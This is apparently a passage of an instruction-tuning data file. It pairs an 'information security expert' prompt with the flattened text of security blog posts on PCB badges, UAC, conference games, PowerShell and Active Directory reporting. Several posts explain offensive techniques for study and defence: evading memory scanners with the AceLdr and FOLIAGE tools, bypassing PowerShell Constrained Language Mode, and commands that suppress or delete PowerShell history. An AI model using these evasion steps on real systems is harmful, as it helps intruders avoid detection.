PCB designers and reached out to a few of them In the end I was quoted a price of 80 with 2 revisions and 2-day delivery of the Gerber Pick and Place and BOM files This appeared to be the obvious way to go considering the tight conference deadlines I was facing Hiring a PCB designer based in Pakistan who I found on the FIVERR website I had the PCB fabrication files in-hand in 2 days as promised In order to accomplish this I had to provide him with rough schematic can even be hand drawn with paper and pencil The following image illustrates what I created in Microsoft Paint and provided to my designer Printed Circuit Board Fabrication Phase With my Gerber zip BOM and PnP files in-hand it was time to reach out to my favorite at that time PCB manufacturer PCBWay in China I had used this fabrication house a year ago on my simple thru-hole CyMon board and was already familiar with their requirements and their pricing Of course I knew that the lead-times and pricing would be greater for this order as I was using low-profile SMD components and they would be doing the 'pick and place assembly Unlike my former PCB order boards only this PCB order would be a two-step process First they will fabricate the PCBs 4 to 5 day lead time and then they will assemble the components 25 to 30 day lead time Likewise there will be two costs involved Bonus tidbit Rather than going with a plain purple board I discovered that I could choose from a variety of colors for my solder mask thin lacquer-like layer of polymer that is applied to the copper traces of a printed circuit board for protection against oxidation and to prevent solder bridges This allows me to 'paint my board black and place a white silk-screen image of my choosing on the board Hardware Badges In-Hand Testing Phase So a month later and with five prototypes in-hand it's time to power up a board and watch the magic WARNING DO NOT DO THIS Unfortunately I did that very thing and not once but twice I found out the hard way that PCBWay had installed a batch of processors from Thailand that were incorrectly stamped pin-1 designation was marked in the wrong corner of the device Although this is a very rare condition there have been cases where this has happened especially with cloned knockoffs Microchip Atmel does not recognize the ATMega328P-UTH as a valid certified part yet we see that part in many products including Arduino's Pro Micro and Pro Mini production boards As I stated very early in this write-up Active components can be severely damaged if wired incorrectly As the microprocessor active component was placed in the wrong orientation due to the incorrect pin-1 markings applying power to the board placed Vcc voltages on the wrong pins and permanently damaged the device Thinking this might have been a defective board out-of-the-box I tried a second board and obtained the same results So at this point I got out my multi-meter and started checking point-to-point connections for continuity In particular I checked for continuity between the yellow blue red and green LEDs and D10 D11 D12 and D13 respectively see schematic above After some time I discovered that the D10 D13 pads were not aligned with the pin numbers according to the ATMega328P pinout I then determined that if we lift the chip and rotate it counter-clockwise one turn it will then be aligned correctly With two boards potentially damaged that left three that might possibly be salvaged Using a heat gun another colleague Rick Wisser removed the processor s cleaned the land areas and placed the chip rotated counter-clockwise one turn This time when powered on the OLED display powered on and we were good to go With three working units the next step was to program these boards by uploading the software for functional testing Valuable Lessons Learned Always do a quick continuity check of the prototype PCB especially with regard to the active components Do this BEFORE POWERING UP THE BOARD for the first time Unfortunately we now need a second order of prototypes and we have to do the design and fabrication processes again another 30 day wait to ensure proper orientation going forward After talking with my designer and attempting to understand how this rare chip orientation issue happened I learned that there are also devices out there with various footprints pin-1 top-left corner pin-1 bottom-left corner etc This being the case we must always be sure to verify the correct position for pin-1 to be sure it coincides with our created board layout during the design phase Note As I recall the fabricator PCBWAY did reach out to us via email and ask us to verify the location of pin-1 to ensure proper placement of the processor The designer confirmed the top-left corner which apparently was incorrect for that particular footprint After two shipments of prototype PCBs and verifying that the programmed boards worked as intended we were now ready to place a large order of 800 PCBs Unfortunately this resulted in yet another valuable lesson When choosing our board components we must always ensure a sufficient in-stock quantity at the build house In our case a critical component for our board now showed as 'out of stock at the build house We now had three options swap the component for a compatible device supply our own parts from a third party source such as Mouser Digikey etc or DNP do not place the component In our case there were no compatible components for our part and after checking with a number of local outlets we soon discovered that all of the major distributors were also out-of-stock and with a back-order well into next year Realizing this we decided to suspend placing our order and put the project on hold for the time being Lead Times Can Hurt Throughout this hardware badge project something became very clear to me I soon realized that at various stages of development I found myself waiting on deliveries I waited on delivery from my CAD designer for the BOM Gerber and Pick and Place files for days at a time Even more I waited on my PCB fabricator build house in China averaging a month to receive fully assembled parts in-hand Additionally there were frequent email messages from Pakistan and China requesting further information regarding questions that arose Due to time zone differences these would result in an additional 1 or 2 days delay Going forward it became apparent that if I wanted to speed up the process I needed to address these time consuming roadblocks This prompted me to revisit learning the CAD software in an effort to remove the need for outsourcing the design work This would not only reduce costs but would also eliminate the delays associated with corresponding with my designer in Pakistan and waiting for my files in-hand Also by taking control of the design process I would be in a better position to correctly answer the many questions that might arise Fortunately for me I came across a very user-friendly and FREE CAD design software package called EasyEDA Thanks to my previous experience with Eagle now being sold as Fusion 360 I quickly came up to speed with EasyEDA In no time at all I had designed a half dozen 'practice boards using low profile SMT components and verified their proper functionality Also related to my EasyEDA discovery I found another PCB fabricator JLCPCB that was able to build and assemble my boards in less than half the time of other"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Avoiding Memory Scanners</title>\n<taxonomies>Red Team, Red Team Tools, AceLdr, cobalt strike, evasion, FOLIAGE, gargoyle, Malware, moneta, pe-sieve, yara</taxonomies>\n<creation_date>Thu, 22 Sep 2022 17:48:35 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kyle Avery Introduction This post compliments a presentation I gave at DEF CON 30 Avoiding Memory Scanners Customizing Malware to Evade YARA PE-sieve and More which included the public release of a new tool called AceLdr The slides for this presentation are available on the conference website As open-source tools and commercial security products improve their ability to scan process memory for malware on Windows red teams are forced to improve their tradecraft to evade them consistently Typically beaconing C2 implants follow a common paradigm in which the malware executes an instruction and then sleeps for a period This process presents a set of opportunities for detection and evasion which this post aims to detail Memory Scanner Capabilities Open-source memory scanners have varying features that can be defined into the following categories Pattern Matching Signature or pattern matching may be the most recognized feature of memory scanners and commercial security products A prime example of this technique is YARA YARA can perform string and byte pattern matching with conditional logic For example consider the following example rule rule Example strings a This program cannot xor b 41 42 43 44 46 condition a or b In this rule the target must contain one of the following to match The string This program cannot or any single-byte XOR encrypted variation The bytes 41 and 42 either 43 or 44 any single byte and 46 This simple example should provide a good picture of what is possible with YARA Anything from simple string or byte patterns to relatively complex combinations of these primitives can be defined Since YARA scans all memory allocated by a target process many projects build off YARA to create more efficient scanners with specific goals For example BeaconEye only scans heap memory in search of Cobalt Strike configuration structures which are dynamically allocated at initialization Commercial security products like AV and EDR are also known to use YARA Namely Carbon Black and CrowdStrike explicitly mention using YARA and other vendors will likely use it A quick Google search can find many YARA rules for Cobalt Strike For example the following demonstration scans two cmd.exe processes with a set of rules targeting Cobalt Strike one benign and one injected with an implant Detecting Cobalt Strike with YARA Memory Attributes Attributes of memory such as permissions and mapping information can also be used to identify potentially malicious code Memory can be readable writeable or executable and mapped as image commit or private commit data Memory is image commit if it was created by loading a file from disk such as an EXE or DLL Memory is private commit if the process dynamically allocated it through API calls such as VirtualAlloc Moneta scans memory pages to look for both executable and private commit memory All code must be executable but code on Windows tends to be loaded from disk Executable private memory occurs legitimately in JIT environments such as the .NET runtime or web browsers Additionally Moneta will check the start address of all threads for private commit memory addresses This check is simple enough to evade since the start address of a thread is not changed after creation A new thread with an image commit start address can be created in a suspended state modified to execute the target shellcode and resumed PE-sieve will scan executable non-executable or inaccessible memory for patterns that typically occur in shellcode depending on the usage In addition PE-sieve will check the return address of all threads for private commit memory addresses Detecting Cobalt Strike with Moneta and PE-sieve Stack Tracing Finally more recent memory scanners have introduced tracing of thread call stacks to identify potentially malicious code Tools like BeaconHunter and Hunt-Sleeping-Beacons operate on a simple premise identify any thread with a wait reason of DelayExecution Since Cobalt Strike and many other implants use the Sleep API call this method can reliably detect malware implants Unfortunately there are often many false positives associated with the technique Since the initial release of AceLdr Hunt-Sleeping-Beacons has been updated with a new method to detect FOLIAGE more on this in the next section The scanner now looks for threads with a wait reason of UserRequest which also have a return address to KiUserApcDispatcher somewhere on their call stack This will be covered in further detail below An interesting variation of stack tracing can be found in MalMemDetect This scanner hooks API calls such as RtlAllocateHeap to check the return address at execution time When Beacon calls one of these APIs the return address on the stack will point to the implant shellcode which resides in private commit memory Detecting Cobalt Strike with MalMemDetect The tools discussed above have capabilities outside this post's scope I'd recommend looking through the code of each scanner if you're interested in learning more Bypassing Memory Scanners Developers can take advantage of their C2 implant's sleep period to implement protections that obfuscate the malware to reduce the likelihood that a scanner will detect it The longer an implant's sleep time the less likely it will be found by scanners evaded by said protections A bypass in the context of this post does not generate false positives It is not meant to confuse analysts or blend in with existing results A true bypass results in zero results from a memory scanner before and after an implant is injected Encrypting Data The first technique that comes to mind for encrypting data is often single-byte XOR Single-byte XOR is conveniently easy to implement doesn't require API calls and runs relatively quickly Unfortunately tools like YARA and PE-sieve realized this and found ways to detect this encryption method with ease An alternative solution might implement functions that perform multi-byte XOR AES or RC4 However it will become apparent in the following sections that this is not a viable option either To completely evade scanners like Moneta which search for any executable private memory the code used for encrypting data must reside in image commit memory You can perform AES encryption using Windows APIs but it requires a combination of multiple API calls to encrypt and decrypt data An excellent solution for this problem is hinted at in Mimikatz The author implements SystemFunction032 a system function that can be resolved from advapi32.dll to perform RC4 encryption and decryption This API call accepts two arguments that contain the target memory and a key allowing us to dynamically generate a key and encrypt data without executing code in private commit memory Technically SystemFunction032 is for encryption and SystemFunction033 is for decryption The RC4 cipher is bidirectional though so you can use either API for encryption or decryption Heap Encryption Now that we've identified a method of encrypting data we must decide which data should be encrypted The beginning of this post referenced BeaconEye a tool that scans dynamically allocated memory for Cobalt Strike configuration data structures Heap encryption is probably best performed in one of two ways Tracking heap entries created by Beacon Utilizing a secondary heap for Beacon's allocations The official Sleep Mask Kit from Cobalt Strike provides a list of memory addresses for encryption Their solution is clean but it requires the use of Sleep Mask Kit which as described in the following section prevents us from bypassing some scanners Last year I released a fork of TitanLdr which creates a new heap before Beacon is loaded The GetProcessHeap API is hooked in the implant's IAT to force it to resolve that heap when resolving the process heap to allocate memory This allows us to encrypt all entries on the secondary heap since only the implant should use it The following demonstration uses this fork to bypass BeaconEye Avoiding BeaconEye Obfuscating Executable Code Consistently bypassing tools like Moneta and PE-sieve requires a combination of encryption to evade pattern matching and memory permission control to evade attribute scanning Executable Masking Stub An executable stub such as that used in Sleep Mask Kit or Shellcode Fluctuation can encrypt the implant code at rest and make it non-executable Both examples require at least one executable region to remain unchanged though There will always be at least one point of detection from scanners using the masking stub technique and YARA rules can be created to detect the stub itself Return Oriented Programming ROP The Gargoyle PoC influenced the creation of the other techniques discussed in this section The author used asynchronous procedure calls to queue and execute a series of ROP gadgets that run while the initiating code is non-executable Gargoyle is only provided for 32-bit Windows and the PoC only executes a message box Earlier this year Waldo-irc released YouMayPasser a 64-bit implementation of Gargoyle ready to use with Cobalt Strike Redirecting Execution with Contexts Gargoyle and YouMayPasser achieve our goal of changing the implant code to non-executable Still they suffer the same issues as many ROP exploits different versions of Windows require modifications to the gadget offsets There are ways to solve this problem but they can introduce significant complexity Inspired by Gargoyle Austin Hudson released FOLIAGE an alternative to traditional ROP which uses the NtContinue API call to control execution during sleep NtContinue is typically used in error handling to restore the execution context of a thread It accepts a new context as the single argument and modifies the current thread to use this context A context structure specifies values for CPU registers including the instruction pointer so it can redirect execution to a specified address FOLIAGE queues a series of APCs which execute NtContinue to switch contexts repeatedly A new context structure is used for each of the following steps in a chain that obfuscates the implant Waits on a new event to keep the thread from exiting Changes the implant memory to be non-executable Instructs the KsecDD driver to encrypt the implant memory Saves the context of the original thread Sets the context of the original thread to a fake context more on this later Sleeps for the specified time with NtDelayExecution Instructs the KsecDD driver to decrypt the implant memory Restores the original thread context Changes the implant memory to be executable Exits the new thread This process can be further examined by reviewing lines 217-512 of sleep.c in FOLIAGE A couple of months ago C5pider claimed to have reversed MDSec NightHawk to create Ekko an alternative to FOLIAGE which uses CreateTimerQueueTimer instead of NtQueueApcThread to queue calls to NtContinue The following demonstration uses FOLIAGE to bypass Moneta and PE-sieve Avoiding Moneta and PE-sieve NtContinue is not the only API call that forcefully changes execution with context structures It conveniently requires only one argument but there are also viable alternatives Avoiding Sleep Tools like BeaconHunter and Hunt-Sleeping-Beacons alert on threads with a wait reason of DelayExecution This detection can be easily evaded using an alternative method of delaying execution which does not set this wait reason WaitForSingleObject is an API that fits this requirement and sets a wait reason of UserRequest The following demonstration replaces the Sleep API call with WaitForSingleObject to bypass these tools Avoiding Hunt-Sleeping-Beacons Return Address Spoofing Spoofing the return address involves modifying the call stack return address so it does not point to private commit memory This section can be split into two distinct techniques at rest and execution return address spoofing Spoofing at Rest The term at rest refers to the implant during sleep Most of the techniques discussed so far focus on this time as well Commercial security products do not appear to be scanning the thread call stacks at rest but open-source scanners such as PE-sieve will check return addresses when scanning This detection is partially evaded using a technique such as ThreadStackSpoofer This PoC hides the return address by overwriting it with zero effectively truncating the stack Then depending on the state of the stack this technique may leak arguments onto the stack These arguments may resemble memory addresses to create an indicator for scanners that inspect return addresses A more stable technique is demonstrated in FOLIAGE The author uses NtSetContextThread to overwrite the original thread's context with a manufactured context that sets the desired return address The usage of NtSetContextThread is relatively rare and may be a point of detection The author had not observed open-source scanners or commercial security products raising alerts on this behavior at the time of release Spoofing at Execution The other time a thread's call stack may be captured is at execution This is demonstrated most clearly in MalMemDetect as described above Our return address must point to image commit memory when we make hooked API calls to evade tools like this The x64 Return Address Spoofing PoC accomplishes this nicely A ROP gadget from a loaded DLL is stored as the return address before the API call is made which jumps to a stub that restores the context necessary to continue execution Avoiding MalMemDetect Since the release of AceLdr Hunt-Sleeping-Beacons has been updated to detect FOLIAGE The scanner will now check all threads with a wait reason of UserRequest which also have a return address to KiUserApcDispatcher somewhere on their call stack This cannot be easily bypassed with the public implementation of FOLIAGE as it requires call stack spoofing of API calls in the sleep chain at execution Since FOLIAGE is obfuscating the shellcode used for return address spoofing it cannot be called by the APC thread to spoof return addresses AceLdr As a part of this research I released an implementation of the previously discussed techniques called AceLdr This tool is a user-defined reflective loader UDRL for Cobalt Strike with the following features at the time of release Bypasses every referenced scanner Easy to use import a single CNA script Encryption using SystemFunction032 Dynamic memory encryption using a secondary heap Code obfuscation and encryption using FOLIAGE Delayed execution using WaitForSingleObject Return address spoofing at execution for InternetConnectA NtWaitForSingleObject and RtlAllocateHeap Black Hills Information Security used this tool for approximately one year before releasing it publicly Below is a demonstration of AceLdr bypassing several memory scanners Avoiding Memory Scanners with AceLdr Closing Thoughts While AceLdr is made explicitly for Cobalt Strike the techniques demonstrated in this post can be easily ported to many other projects Each method presented here bypasses existing scanners However this does not guarantee they will evade future implementations as we've already seen with Hunt-Sleeping-Beacons Memory scanners and commercial security products are not the same but they share many characteristics For example evading open-source scanners does not guarantee security product evasion In addition security product evasion often does not require a complete memory scanner bypass since system resources and development costs limit vendors Credits ithub.com SecIdiot FOLIAGE ww.unknowncheats.me forum anti-cheat-bypass 268039-x64-return-address-spoofing-source-explanation.html ithub.com waldo-irc YouMayPasser ithub.com Cracked5pider Ekko ithub.com waldo-irc MalMemDetect"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Constrained Language Mode Bypass When __PSLockDownPolicy Is Used</title>\n<taxonomies>Blue Team, General InfoSec Tips & Tricks, Informational, InfoSec 101, Red Team, Carrie Roberts, PowerShell</taxonomies>\n<creation_date>Tue, 27 Sep 2022 15:30:59 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts PowerShell's Constrained Language CLM mode limits the functionality available to users to reduce the attack surface It is meant to be used in conjunction with application control solutions like Device Guard User Mode Code Integrity If CLM is enabled without proper application control settings it is not an effective security solution One method for enabling CLM the wrong way is using the __PSLockDownPolicy environment variable This is what Microsoft has to say about that As part of the implementation of Constrained Language PowerShell included an environment variable for debugging and unit testing called __PSLockdownPolicy While we have never documented this some have discovered it and described this as an enforcement mechanism This is unwise because an attacker can easily change the environment variable to remove this enforcement In addition there are also file naming conventions that enable FullLanguage mode on a script effectively bypassing Constrained Language reference A malicious user with admin privileges could simply remove the environment variable but what about a user without admins privs At the end of the quote above there is a very intriguing statement In addition there are also file naming conventions that enable FullLanguage mode on a script effectively bypassing Constrained Language There are file naming conventions to enable Full Language mode Do tell inquiring minds want to know I'm preparing a 16-hour course on PowerShell For InfoSec where I will be covering this topic and I didn't feel comfortable making such a statement without actually knowing how to do it So I put Google Search through the paces trying to find the magic file naming convention with no luck Ultimately I bit the bullet and actually looked at the PowerShell source code and now I share the magic with you reference And there we have it We just need to have System32 somewhere in the path of the PowerShell script that we want to run in Full Language mode and it will do it Let's test it out First from an administrative PowerShell prompt enable CLM using the environment variable aka the wrong way Environment SetEnvironmentVariable '__PSLockdownPolicy '4 'Machine Now we will use this super simple script just to print out the current language mode Let's run the script first from a path that does not contain System32 and then again from a path that does And there you have it we can easily run any script in full language mode in this case even without administrative access Keep this trick in mind the next time you run into CLM on a pentest to help ensure the organization has implemented it correctly If you are interested in learning more about PowerShell topics such as 'Just Enough Admin PowerShell remoting language modes and more check out my 16-hour course called PowerShell For InfoSec here"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Why You Really Need to Stop Disabling UAC</title>\n<taxonomies>Author, Blue Team, Noah Heckman, Administration, UAC, Windows</taxonomies>\n<creation_date>Wed, 28 Sep 2022 20:18:50 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Noah Heckman Windows Vista didn't have many fans in the Windows community to put it lightly It beaconed in a new user interface file structure and a bunch of darn popups asking if you really want to execute the software you just told it to execute Many sysadmins have found this annoying but even more annoying was all the end users calling to tell them about how annoying it was There was a simple solution just disable it Over time some went back and turned it on while others did not instead letting the GPO's disabling UAC remain in their active directory to this day However for those who turned it back on they were once again reminded about how annoying it was and how many issues it caused This was of course a double-edged sword as UAC was also annoying to our adversaries So what does UAC do UAC starts its work as soon as you log in It checks if your account is an admin on the system and if it is then the UAC subroutine effectively splits the account into a high privilege and low privilege account It locks admin operations behind an admin token which then will prompt you for approval when you go to perform high privilege processes as you see below This is known as Admin Approval mode and does not require the user to input the password In my opinion this window should say WARNING This process is trying to perform admin actions Do you expect this for this application because that is what it means when it interrupts your important spreadsheet session If you are performing a process that only requires low privilege activities and you see this you should stop right now A common question that has been asked about admin approval mode is How is this safe Can't the process just hit yes for the user and execute the payload Not exactly both the normal UAC and the admin approval UAC prompt are supposed to come up in the Windows Secured Desktop Environment When this happens only certain processes can interact with it Specifically the logged-in user's explorer.exe process So in general no there is not a way for the malware to just click yes Of course there is a slew of UAC bypass attacks that attempt to subvert these protections so it is not infallible but it does dramatically increase the security posture of the system versus having it disabled If that is not enough of a reason to make sure you have it enabled then how about macros UAC protects a computer from malicious macros more than you think Of course it will go off as described above if the macro tries to access or modify sensitive system objects but what many don't know is that when you disable UAC you also disable Mark of The Web MoTW MoTW is used to flag files that have been downloaded to your computer from untrusted locations such as downloaded from the internet or sent as an email attachment Office applications and other Windows processes look for this mark and will restrict certain actions based on it until you approve it This is why when you open an Excel document with macros on the internal share it doesn't prompt you to enable editing and exit Microsoft Office's Protected Viewer If your security team is pushing out the GPO settings to Block Macros in Files Downloaded from the Internet this also relies on MoTW Therefore if UAC is disabled the document will not have the MoTW attribute and will sometimes run the macro without prompting which makes phishing your end users a walk in the park Another notable feature related to MoTW is the Windows Smart Screen which is in place to prevent the execution of untrusted code SmartScreen operates around many of the same principles above by prompting the user on the Secure desktop asking if they really want to execute the untrusted program Again this can help with preventing many initial compromise attacks As defenders we not only need to ensure that these protections are active but that we are using them to our advantage Disabling macros from documents downloaded from the internet is a great start Ensure Windows SmartScreen is enabled on the system For bonus points consider preventing your end users from being able to bypass it with the run anyway button This will harden your systems making it even harder for attacks to gain a foothold All of these settings can be managed by GPO or Intune policy and pushed to the environment with minimal impact The foundation of a security program is built on good communication So should you get complaints from your IT staff developers or end-users please take a moment to explain the underlying process In their eyes UAC is nothing but an annoyance and the standard because security said so response is not going to convince them otherwise We are all busy but taking the time now to educate our people helps to prevent misinformed configurations like the ones that prompted this article from being made in the future"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>POGS at Wild West Hackin' Fest!</title>\n<taxonomies>Fun & Games, WWHF: Deadwood 2022</taxonomies>\n<creation_date>Wed, 12 Oct 2022 21:19:24 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ean Meyer This post is for attendees of Wild West Hackin Fest Deadwood 2022 POGs Yes POGs If you aren't familiar with POGs this game started decades ago reaching the peak of its popularity in the 1990s The game is simple players have stacks of cardboard discs with logos memes and other graphic POGs that they place face down as well as a slammer To start two players contribute an equal number of POGS from their collection to create a combined stack of 10-14 POGs They then take turns throwing their slammer at the stack The POGs explode up when hit The ones that land face up are kept by the player that threw the slammer The game continues until the players decide they are done or they run out of POGs to play with Want to know more about POGs Check this out ww.youtube.com watch?v RTOmg9y8yv4 Want to know how to play Watch this outu.be smobVX9MdWY You might be wondering what this has to do with a security conference It has nothing to do with security and everything to do with helping people meet each other and create new relationships At WWHF Deadwood 2022 attendees will have opportunities to play POGs meet others network and win amazing prizes Each attendee will get a starter pack of POGs with the logos of our fantastic sponsors and a slammer so you can start playing immediately and you will want to play when you hear what you can win At Sponsor Stampede At the Sponsor Stampede on Wednesday night at 6 00pm you will be able to meet with sponsors at seven locations where they will have rare POGs to collect and play with The Sponsor Stampede will end back at the Deadwood Mountain Grand There you have multiple ways to win prizes Show the registration desk you've collected all the rare POGs and you will get a ticket to win in our prize drawing that evening Members of the Content Community Team will be wandering the hall looking for people playing POGs Every time they spot you playing POGs with a new person you can get another ticket to win What can you win Great question glad you asked Winners of the Sponsor Stampede POG game will get a Back to the Future Flux Capacitor for their desk AND a ticket to next year's Wild West Hackin Fest Rare Drops During the conference more Rare POGs may be dropped with specific sponsors Listen for announcements from MCs for Rare Drops and where to get them POG Rustling Champion Don't stop playing after the Stampede At the end of the conference a POG Rustling Champion will be announced Play POGs with attendees to win their POGs Stop by the registration desk before 4pm and count out your POGs We will write down your name how many POGs you have and the person with the most POGs will be declared the WWHF Deadwood 2022 POG Rustling Champion The POG Rustling Champion will receive A trophy A Back to the Future Lego Delorean kit valued at 200 A trip to WWHF Deadwood 2023 including badge hotel and airfare valued up to 1500 So play POGs and win prizes but more importantly make new friends and connections with people We want you to have fun and build relationships that last well beyond the con Get your slammer out and get those POGs We hope you have a blast Let us know what you think we definitely want your feedback"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Talkin' About Infosec News - 10/17/2022</title>\n<taxonomies>Informational</taxonomies>\n<creation_date>Tue, 18 Oct 2022 18:37:09 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "outu.be z1bpUHK-4wA 00 00 PreShow Banter Dumpster Fire Friends03 07 PreShow Banter WHHF Deadwood ildwesthackinfest.com deadwood 03 48 BHIS Talkin Bout infosec News 2022-10-0307 37 Story 1 High-severity Microsoft Exchange 0-day under attack threatens 220 000 serversrstechnica.com information-technology 2022 09 high-severity-microsoft-exchange-0-day-under-attack-threatens-220000-servers 19 30 Story 2 Stealthy hackers target military and weapons contractors in recent attackww.bleepingcomputer.com news security stealthy-hackers-target-military-and-weapons-contractors-in-recent-attack 25 52 Story 3 Putin grants Russian citizenship to Edward Snowdenww.npr.org 2022 09 26 1125109303 putin-edward-snowden-russian-citizenship29 09 Story 4 What the Securing Open Source Software Act does and what it missesww.zdnet.com article whats-what-in-the-united-states-securing-open-source-software-act 38 17 Story 4b SecBSD Teamecbsd.org team.html40 43 Story 5 New Malware Campaign Targeting Job Seekers with Cobalt Strike Beaconshehackernews.com 2022 09 new-malware-campaign-targeting-job.html"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>New PowerShell History Defense Evasion Technique</title>\n<taxonomies>Blue Team, Carrie Roberts, General InfoSec Tips & Tricks, Informational, InfoSec 101, Recon, Red Team</taxonomies>\n<creation_date>Tue, 29 Nov 2022 16:15:11 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts PowerShell incorporates the handy feature of writing commands executed to a file to make them easy to refer back to later This functionality is provided by the PSReadline module This feature is helpful from a usability perspective but can be a tool that hackers use against you For example if sensitive information like passwords are entered into the PowerShell command line they will also be added to the history file and a hacker can review this history to discover that sensitive information In an effort to solve this issue the PSReadline module version v2.0.4 will skip adding a command line to the history file if it contains sensitive words like more info here Password Asplaintext Token Apikey Secret PowerShell v7.0.11 ships with a PSReadline version that supports this feature out-of-the-box but Windows PowerShell version 5.1 ships with PSReadline version 2.0.0 and doesn't support this feature however it can easily be updated Let's see the sensitive history scrubbing in action In the image above we ran three commands one of which contained one of the words that trigger the sensitive filter Notice that the password line is not listed when we cat aka print to screen the history file This is kind of nifty but it also makes for a really easy defense evasion technique where a hacker can control which of their commands show up in the history file In the image above we were able to keep the second command from being recorded in the history file by simply adding a comment containing one of the sensitive words This really isn't an earth-shattering discovery because attackers have always been able to open the history file and individually remove commands from it if they wanted to Nevertheless this does make this defense evasion tactic even easier and is a trick that I would use on my next red teaming engagement Another interesting option for defense evasion is to define your own code for deciding whether a command is written to the history file We could disable all history logging for the current session as follows Set-PSReadLineOption -AddToHistoryHandler return false The AddToHistoryHandler receives the current command as the line variable and then returns true if the line should be written to the history file Here we simply return false so nothing gets added to the history file for the current session On the defensive side we could keep an eye out for any funny business when the AddToHistoryHandler parameter is used In fact keeping an eye on the use of all the PSReadLineOption functions would probably be a good idea Here are a few more examples of defense evasion Prevent logging Set-PSReadlineOption -HistorySaveStyle SaveNothing Delete history file Remove-Item Get-PSReadlineOption .HistorySavePath Set alternate file path Set-PSReadLineOption -HistorySavePath env TEMP out.txt Use ContrainedLanguage mode ExecutionContext.SessionState.LanguageMode ConstrainedLanguage If you are interested in learning more about PowerShell topics such as 'Just Enough Admin PowerShell remoting language modes and more check out my 16-hour course called PowerShell For InfoSec here"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>PlumHound Reporting Engine for BloodHoundAD</title>\n<taxonomies>Author, Blue Team, Informational, Kent Ickler, Active Directory, bloodhound, BloodHoundAD, Control Paths, Domains, PlumHound, Purple Team, reports, System Administration</taxonomies>\n<creation_date>Tue, 06 Dec 2022 17:05:22 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler It's been over two years since Jordan and I talked about a Blue Team's perspective on Red Team tools A Blue Team's Perspective on Red Team Hack Tools YouTube The webcast itself had interesting topics at the end of the discussion we talked about a tool we wrote PlumHound is a report engine for BloodHoundAD to make actionable reports for Blue Teams Systems Administrators and Analysts We figured it's about time we got around to writing this blog The framework for PlumHound is relatively simple utilize the control path-finding capabilities of BloodHoundAD in Neo4j to build actionable intelligence for blue teams to identify Active Directory problems A while into development we ran into Mathieu Saulnier Scoubi who had a similar project Finding similar objectives we merged our efforts Mathieu brought in additional modules that would identify the weakest link AnalyzePath to a control path vulnerability and the most important paths to remediate first BusiestPath to be most effective both modules of his BlueHound project On pentests where we found interesting control path vulnerabilities we took a few moments to analyze the condition and if it was something new write a new PlumHound report using Neo4j cyphers Meanwhile other information security teams began to use the report engine to build their own reports as well Today we have 69 PlumHound reports in the packaged Default reports plus the Busiest Path and Analyze Path functions of Mathieu Saulnier's BlueHound So how does it all work First off we have to acknowledge that we stand on the shoulders of the giants that built Neo4j BloodHoundAD and its data collectors With that said PlumHound uses Python to connect to the Neo4j database after 